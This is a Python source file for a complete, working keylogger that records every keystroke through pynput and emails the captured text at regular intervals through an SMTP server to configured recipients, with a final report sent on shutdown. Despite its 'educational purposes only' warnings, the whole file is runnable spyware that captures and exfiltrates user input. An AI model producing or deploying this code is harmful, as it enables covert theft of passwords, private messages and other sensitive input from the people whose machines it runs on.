#!/usr/bin/env python3
"""
Keylogger Implementation - For Educational Purposes Only
Use only in isolated, controlled environments with explicit permission.
"""

import logging
import os
import smtplib
import threading
from email.mime.text import MIMEText
from typing import List, Optional

from pynput.keyboard import Key, Listener

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger(__name__)


class KeyloggerConfig:
    """Configuration class for Keylogger settings."""

    # Email configuration
    SMTP_SERVER = os.getenv("SMTP_SERVER", "smtp.gmail.com")
    SMTP_PORT = int(os.getenv("SMTP_PORT", "465"))
    SENDER_EMAIL = os.getenv("SENDER_EMAIL", "your_email@gmail.com")
    RECIPIENT_EMAILS = os.getenv("RECIPIENT_EMAILS", "recipient@example.com").split(",")
    EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD", "your_app_password")

    # Keylogger settings
    REPORT_INTERVAL = int(os.getenv("REPORT_INTERVAL", "30"))  # seconds
    MAX_LOG_SIZE = int(os.getenv("MAX_LOG_SIZE", "10000"))  # characters


class Keylogger:
    """
    A keylogger implementation with email reporting capabilities.

    WARNING: This tool is for educational purposes only.
    Unauthorized use of keyloggers is illegal and unethical.
    Always obtain explicit permission before monitoring any system.
    """

    def __init__(self, config: Optional[KeyloggerConfig] = None):
        """
        Initialize the Keylogger instance.

        Args:
            config: Configuration object (uses default if None)
        """
        self.config = config or KeyloggerConfig()
        self.log = ""
        self.is_first_run = True
        self.request_shutdown = False
        self.timer: Optional[threading.Timer] = None
        self.listener: Optional[Listener] = None

        # Special key mappings for better readability
        self.special_keys = {
            Key.space: " ",
            Key.backspace: " [BACKSPACE] ",
            Key.enter: " [ENTER]\n",
            Key.shift: " [SHIFT] ",
            Key.alt: " [ALT] ",
            Key.ctrl: " [CTRL] ",
            Key.tab: " [TAB] ",
            Key.esc: " [ESC] ",
            Key.caps_lock: " [CAPS_LOCK] ",
            Key.delete: " [DELETE] ",
            Key.up: " [UP] ",
            Key.down: " [DOWN] ",
            Key.left: " [LEFT] ",
            Key.right: " [RIGHT] ",
            Key.home: " [HOME] ",
            Key.end: " [END] ",
            Key.page_up: " [PAGE_UP] ",
            Key.page_down: " [PAGE_DOWN] ",
        }

    def on_key_press(self, key: Key) -> None:
        """
        Handle key press events.

        Args:
            key: The key that was pressed
        """
        try:
            # Handle regular characters
            self.log += key.char
        except AttributeError:
            # Handle special keys
            key_str = self.special_keys.get(
                key, f" [{str(key).upper().replace('KEY.', '')}] "
            )
            self.log += key_str

        # Trim log if it exceeds maximum size
        if len(self.log) > self.config.MAX_LOG_SIZE:
            self.log = self.log[-self.config.MAX_LOG_SIZE :]

        # Debug logging (disabled by default for privacy)
        logger.debug(f"Key pressed: {str(key)[:20]}")

    def send_email(self, subject: str, body: str) -> bool:
        """
        Send email with the specified subject and body.

        Args:
            subject: Email subject
            body: Email body content

        Returns:
            bool: True if email sent successfully, False otherwise
        """
        try:
            # Create email message
            msg = MIMEText(body)
            msg["Subject"] = subject
            msg["From"] = self.config.SENDER_EMAIL
            msg["To"] = ", ".join(self.config.RECIPIENT_EMAILS)

            # Send email via SMTP
            with smtplib.SMTP_SSL(
                self.config.SMTP_SERVER, self.config.SMTP_PORT
            ) as smtp_server:
                smtp_server.login(self.config.SENDER_EMAIL, self.config.EMAIL_PASSWORD)
                smtp_server.sendmail(
                    self.config.SENDER_EMAIL,
                    self.config.RECIPIENT_EMAILS,
                    msg.as_string(),
                )

            logger.info("Email sent successfully")
            return True

        except smtplib.SMTPAuthenticationError as e:
            logger.error(f"SMTP authentication failed: {e}")
            logger.error(
                "Please check your email credentials and enable 'Less secure app access' or use App Password"
            )
            return False
        except smtplib.SMTPException as e:
            logger.error(f"SMTP error occurred: {e}")
            return False
        except Exception as e:
            logger.error(f"Unexpected error sending email: {e}")
            return False

    def generate_report(self) -> None:
        """Generate and send the keylogger report."""
        if self.request_shutdown:
            return

        try:
            # Determine email body based on whether this is the first run
            if self.is_first_run:
                email_body = "Keylogger has started successfully and is now monitoring."
                subject = "Keylogger Started Successfully"
                self.is_first_run = False
            else:
                if not self.log:
                    logger.info("No new keystrokes to report")
                else:
                    email_body = self.log
                    subject = f"Keylogger Report - {len(self.log)} characters captured"
                    self.log = ""  # Clear log after sending

            # Send the email if we have content
            if "email_body" in locals():
                self.send_email(subject, email_body)

            # Schedule next report if not shutting down
            if not self.request_shutdown:
                self.timer = threading.Timer(
                    self.config.REPORT_INTERVAL, self.generate_report
                )
                self.timer.daemon = (
                    True  # Allow program to exit even if timer is running
                )
                self.timer.start()

        except Exception as e:
            logger.error(f"Error generating report: {e}")

    def shutdown(self) -> None:
        """Gracefully shutdown the keylogger."""
        logger.info("Shutting down keylogger...")
        self.request_shutdown = True

        # Cancel any pending timer
        if self.timer and self.timer.is_alive():
            self.timer.cancel()
            self.timer.join(timeout=1)

        # Stop the keyboard listener
        if self.listener and self.listener.is_alive():
            self.listener.stop()

        # Send final report if there's unsent data
        if self.log:
            logger.info("Sending final report...")
            self.send_email("Keylogger Final Report", self.log)
            self.log = ""

        logger.info("Keylogger shutdown complete")

    def start(self) -> None:
        """Start the keylogger listener and reporting mechanism."""
        logger.info("Starting keylogger...")

        try:
            # Create and configure keyboard listener
            self.listener = Listener(on_press=self.on_key_press)
            self.listener.daemon = True

            # Start listening for keyboard events
            self.listener.start()
            logger.info("Keyboard listener started")

            # Start the first report cycle
            self.generate_report()

            # Keep the main thread alive
            self.listener.join()

        except Exception as e:
            logger.error(f"Error starting keylogger: {e}")
            self.shutdown()
            raise


if __name__ == "__main__":
    print("WARNING: This keylogger is for educational purposes only!")
    print("Make sure you have proper authorization before use.")

    try:
        keylogger = Keylogger()
        keylogger.start()
    except KeyboardInterrupt:
        print("\nKeyboard interrupt received")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
    finally:
        if "keylogger" in locals():
            keylogger.shutdown()
